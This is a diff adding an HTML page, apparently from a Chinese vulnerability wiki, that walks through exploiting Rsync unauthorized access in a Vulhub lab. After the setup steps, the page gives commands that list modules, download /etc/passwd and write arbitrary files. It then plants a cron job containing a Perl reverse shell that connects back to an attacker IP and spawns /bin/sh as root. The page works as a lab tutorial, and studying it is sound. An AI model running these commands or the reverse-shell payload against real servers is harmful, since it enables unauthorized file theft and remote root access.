@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Rsync 未授权访问漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Rsync \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Ruby%20NetFTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2017-17405/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Ruby%20NetFTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2017-17405/" class="btn btn-xs btn-link">
+        Ruby Net::FTP 模块命令注入漏洞 CVE-2017-17405
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/" class="btn btn-xs btn-link">
+        QEMU 虚拟机逃逸漏洞 CVE-2020-14364
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="rsync">Rsync 未授权访问漏洞<a class="headerlink" href="#rsync" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Vulhub编译及运行Rsync服务器：</p>
+<div class="highlight"><pre><span></span><code>docker-compose build
+docker-compose up -d
+</code></pre></div>
+<p>环境启动后，可以使用Rsync命令访问：</p>
+<div class="highlight"><pre><span></span><code>rsync rsync://your-ip:873/
+</code></pre></div>
+<p><img alt="image-20220303133847165" src="../images/202203031338267.png" /></p>
+<blockquote>
+<p>若Vulhub环境启动时报错<code>standard_init_linux.go:211: exec user process caused "no such file or directory"</code>，执行命令 <code>dos2unix docker-entrypoint.sh</code>，即可成功启动。</p>
+</blockquote>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>访问建立后，可以查看模块名列表，有一个src模块，我们再列出这个模块下的文件：</p>
+<div class="highlight"><pre><span></span><code>rsync rsync://your-ip:873/src/
+</code></pre></div>
+<p>这是一个Linux根目录，我们可以下载任意文件：</p>
+<div class="highlight"><pre><span></span><code>rsync -av rsync://your-ip:873/src/etc/passwd ./
+</code></pre></div>
+<p>或者写入任意文件：</p>
+<div class="highlight"><pre><span></span><code>rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
+</code></pre></div>
+<h3 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<p>写入cron任务反弹shell。</p>
+<p>shell文件内容如下：</p>
+<div class="highlight"><pre><span></span><code># 此处指定用户root不可省略
+* * * * * root perl -e &#39;use Socket;$i=&quot;192.168.174.128&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre></div>
+<p>上传shell文件触发反弹shell：</p>
+<div class="highlight"><pre><span></span><code>rsync -av shell rsync://192.168.174.128:873/src/etc/cron.d/shell
+</code></pre></div>
+<p><img alt="image-20220303140727513" src="../images/202203031407618.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Ruby%20NetFTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2017-17405/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Ruby%20NetFTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2017-17405/" class="btn btn-xs btn-link">
+        Ruby Net::FTP 模块命令注入漏洞 CVE-2017-17405
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/" class="btn btn-xs btn-link">
+        QEMU 虚拟机逃逸漏洞 CVE-2020-14364
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
